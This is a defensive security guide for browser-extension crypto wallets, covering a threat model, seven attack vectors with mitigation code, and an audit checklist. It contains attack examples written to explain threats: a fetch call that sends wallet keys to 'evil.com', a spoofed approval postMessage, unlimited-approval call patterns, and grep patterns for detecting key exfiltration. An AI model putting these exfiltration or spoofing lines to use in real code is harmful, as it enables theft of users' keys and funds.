# Security Threats & Mitigations

Browser extension wallets are high-value targets. This document covers the threat model,
known attack vectors, and concrete mitigations. Reference when building, auditing, or
reviewing wallet code.

---

## Threat Model

**Assets at risk**: Private keys, seed phrases, user funds, transaction approvals.

**Attacker capabilities to defend against**:
- Malicious websites (XSS, phishing, injected scripts)
- Other browser extensions
- Compromised npm packages (supply chain)
- Malicious dApps requesting signatures
- Physical access to the browser (stolen session)
- Fake/cloned extension distributed via app stores

**Trust boundary**: The background service worker is the only trusted context. Everything
else — content scripts, injected page scripts, popup UI, dApp requests — is untrusted
input that must be validated before acting on.

---

## Attack Vector 1: Supply Chain (Highest Impact)

### Threat
A malicious actor compromises a dependency and ships an update that exfiltrates key
material. The Trust Wallet incident, Ledger Connect Kit exploit, and dozens of smaller
incidents all followed this pattern. Crypto theft via personal wallet compromise reached
$713M in 2025 (Chainalysis).

### How it works
1. Attacker gains publish access to a popular npm package (via phishing, expired token, or typosquatting)
2. Ships a patch version that adds `fetch('https://evil.com', { body: JSON.stringify(window.__walletKeys) })`
3. Every wallet that `npm install`s the patch ships the exfiltration code to users

### Mitigations
```json
// package-lock.json — commit and enforce exact versions
// Never use ^ or ~ in wallet dependencies
{
  "dependencies": {
    "@scure/bip39": "1.3.0",
    "bitcoinjs-lib": "6.1.7"
  }
}
```

```yaml
# CI — fail if lock file has changed without explicit approval
- name: Check lock file integrity
  run: git diff --exit-code package-lock.json
```

- **Subresource integrity**: Lock all external resources
- **`npm audit`** in CI — fail on high/critical severity
- **Minimal dependencies**: Every dep is an attack surface; prefer audited zero-dep crypto libs (`@noble/*`, `@scure/*`)
- **Automated alerts**: Dependabot or Socket.dev for dependency monitoring
- **Review changelogs** before updating crypto-related dependencies

---

## Attack Vector 2: Phishing & Fake Extensions

### Threat
Attackers clone legitimate wallets and publish them to the Chrome Web Store with nearly
identical names/icons. MetaMask's team documented a fake extension called "Safery:
Ethereum Wallet" that lived in the official Web Store for two months.

### How it works
1. Clone legitimate wallet source
2. Add key exfiltration (transmit seed on import/creation)
3. Submit to Web Store under similar name (e.g. "Phantom Wallet Pro", "MetaMask Official")
4. Promote via fake social media, SEO-poisoned search results

### Mitigations
- **Deterministic extension IDs**: Include your extension's public key in `manifest.json`
  (`"key": "MIIBIjAN..."`) so your ID never changes even after reinstall
- **`update_url`**: Point to your own update server for enterprise distributions
- **Published checksums**: List your official extension ID prominently on website/docs
- **Content Security Policy**: The tightest possible CSP limits what attacker-added code can do
- **No remote code execution**: Never `eval()`, never load remote scripts — this is why
  `'unsafe-eval'` must never appear in your CSP

---

## Attack Vector 3: Malicious dApp / Blind Signing

### Threat
A dApp presents a transaction that appears benign (e.g. "Approve USDC") but actually
signs a `transfer()` call draining the wallet, or an `approve()` with `type(uint256).max`
(unlimited spend approval). Users click "sign" without reading the hex.

### How it works
- EVM: `approve(attacker, 2**256-1)` — unlimited token approval
- EVM: `setApprovalForAll(attacker, true)` — approve all NFTs
- EVM: Encoded `transfer` masquerading as `mint` in the UI
- Solana: Instruction data that looks like a SOL transfer but touches a malicious program
- Bitcoin: PSBT with extra outputs silently sweeping UTXOs

### Mitigations

**Always simulate before signing**:
```typescript
// Ethereum — decode and display intent
import { decodeFunctionData, parseAbi } from 'viem';
const decoded = decodeFunctionData({ abi, data: tx.data });
// Show: "Transfer 1000 USDC to 0xabc..." NOT "0xa9059cbb000..."

// Solana
const sim = await connection.simulateTransaction(tx);
const tokenChanges = parseTokenBalanceChanges(sim.value.preBalances, sim.value.postBalances);
// Show: "-1000 USDC, +0.001 SOL" as a clear summary
```

**Dangerous pattern detection**:
```typescript
// Ethereum — flag high-risk approvals before showing sign UI
function analyzeEthTransaction(tx: Transaction): Warning[] {
  const warnings: Warning[] = [];
  if (isUnlimitedApproval(tx)) warnings.push({ level: 'critical', msg: 'Unlimited token approval' });
  if (isSetApprovalForAll(tx)) warnings.push({ level: 'critical', msg: 'Approves all NFTs' });
  if (isContractCreation(tx)) warnings.push({ level: 'info', msg: 'Deploys a contract' });
  return warnings;
}
```

**Phishing domain blocking**:
```typescript
// Solflare pattern: eth-phishing-detect + webRequest interception
import PhishingDetector from 'eth-phishing-detect';
chrome.webRequest.onBeforeRequest.addListener(
  (details) => {
    if (detector.check(new URL(details.url).hostname).result) {
      return { redirectUrl: chrome.runtime.getURL('phishing.html') };
    }
  },
  { urls: ['http://*/*', 'https://*/*'] },
  ['blocking'],
);
```

---

## Attack Vector 4: Content Script Injection / Message Spoofing

### Threat
A malicious website or extension injects code into a content script's context, intercepts
messages between the page and background, or spoofs approval responses to trick the wallet
into signing without user consent.

MetaMask historically had a vulnerability where attackers could spoof the confirmation
message, causing an arbitrary transaction to be signed.

### How it works
1. Malicious page script calls `window.postMessage({ type: '@wallet/sign', approved: true })`
2. Content script forwards without validating origin
3. Background signs without a real popup confirmation

### Mitigations
```typescript
// content-script: always validate both origin AND source
window.addEventListener('message', (event) => {
  if (event.source !== window) return;           // must be same window object
  if (event.origin !== window.location.origin) return; // must be same origin
  if (!isValidMessageShape(event.data)) return;  // typed, validated
  chrome.runtime.sendMessage(event.data);
});

// background: validate sender is a content script, not another extension or page
chrome.runtime.onMessage.addListener((msg, sender) => {
  if (!sender.tab) return;        // reject non-tab senders
  if (!sender.tab.id) return;     // reject invalid tabs
  if (sender.frameId !== 0) {     // optional: only accept from top frame
    // decide per use case
  }
  // proceed
});
```

**Approval requests must originate from popup UI, not content script**:
- Content script forwards *requests* from dApps
- Background opens a popup and waits for user interaction in the popup
- Popup sends approval decision back to background via `chrome.runtime.sendMessage`
- Content script never sends an approval — only requests

---

## Attack Vector 5: Malicious Browser Extension (Extension-to-Extension)

### Threat
Another extension installed in the browser can read storage, intercept messages, or
inject code. Chrome's extension isolation helps but doesn't fully prevent inter-extension
attacks against extensions that use `externally_connectable`.

### Mitigations
- Don't declare `externally_connectable` unless strictly necessary
- Use `chrome.storage.session` (in-memory, not readable by other extensions) for key material
- Encrypt everything in `chrome.storage.local` — even if another extension reads it,
  they see only ciphertext
- Don't expose internal APIs via `web_accessible_resources` beyond the minimum needed

---

## Attack Vector 6: Compromised Session (Physical / Remote Access)

### Threat
An attacker gains access to the browser (physical theft, remote desktop, malware) while
the wallet is unlocked. They can transact freely until the wallet auto-locks.

### Mitigations
```typescript
// Auto-lock after inactivity (Slush wallet uses chrome.alarms)
const AUTO_LOCK_MINUTES = 5; // user-configurable

chrome.alarms.create('auto-lock', { delayInMinutes: AUTO_LOCK_MINUTES });
chrome.alarms.onAlarm.addListener((alarm) => {
  if (alarm.name === 'auto-lock') lockWallet();
});

// Reset timer on any user interaction
chrome.runtime.onMessage.addListener(() => {
  chrome.alarms.create('auto-lock', { delayInMinutes: AUTO_LOCK_MINUTES });
});
```

- **`chrome.storage.session`** for decrypted key material — clears automatically on browser close
- **Re-authentication** for transactions above a configurable threshold
- **Biometric unlock** via `chrome.identity` / WebAuthn where available
- **Visible lock state** — clear "locked/unlocked" indicator in popup header

---

## Attack Vector 7: RPC Endpoint Compromise

### Threat
A compromised or malicious RPC endpoint returns fraudulent data: wrong balances,
missing pending transactions, or manipulated simulation results that hide malicious
transaction effects.

### Mitigations
- **Multiple RPC endpoints** with failover and result cross-checking for critical reads
- **Never trust simulation results from a single endpoint** for high-value transactions
- Allow users to configure their own RPC endpoints
- Use well-known public endpoints as default (Solflare's own RPC, Infura, Alchemy)
- For Ethereum, consider light client verification (Helios) for critical state queries

---

## Audit Checklist

Use this when reviewing wallet code (yours or others'):

### Key Material
- [ ] Keys only decrypted in background service worker
- [ ] `chrome.storage.session` for in-memory keys (not `local`)
- [ ] AES-256-GCM + PBKDF2 ≥ 900,000 iterations
- [ ] Mnemonic buffer zeroed after derivation (`buf.fill(0)`)
- [ ] Auto-lock with configurable inactivity timeout

### Extension Architecture
- [ ] CSP: no `unsafe-eval`, no external `script-src`
- [ ] `wasm-unsafe-eval` only if WASM crypto is actually used
- [ ] Content scripts check both `event.origin` AND `event.source`
- [ ] Background validates `sender.tab` on all `onMessage` listeners
- [ ] No `externally_connectable` unless required
- [ ] `web_accessible_resources` is minimal (only `dapp-interface.js`)
- [ ] Background service worker is an ES module (`"type": "module"`)

### Transaction Safety
- [ ] Every transaction simulated before signing UI shown
- [ ] Transaction decoded to human-readable intent (no raw hex)
- [ ] Unlimited approvals (EVM) explicitly warned
- [ ] `setApprovalForAll` explicitly warned
- [ ] Phishing domain detection active
- [ ] Rate limiting on dApp signing requests

### Supply Chain
- [ ] All dep versions exact-locked in `package-lock.json`
- [ ] `npm audit` runs in CI and fails on high/critical
- [ ] Crypto libraries: `@noble/*` and `@scure/*` preferred
- [ ] No `elliptic` package (older, less audited)
- [ ] Dependency update PRs reviewed by a human before merging

### Common Vulnerable Patterns to Search For
```bash
# Grep for these in the codebase — each warrants investigation
grep -r "eval("            src/   # direct eval
grep -r "unsafe-eval"      src/   # CSP bypass
grep -r "localStorage"     src/   # key material in localStorage?
grep -r "chrome.storage.local.set" src/ | grep -i "key\|mnemonic\|seed\|private"
grep -r "postMessage"      src/   # check all handlers validate origin
grep -r "window.ethereum\s*=" src/ # provider overwrite?
grep -r "fetch.*nsec\|fetch.*private\|fetch.*mnemonic" src/ # exfiltration
```
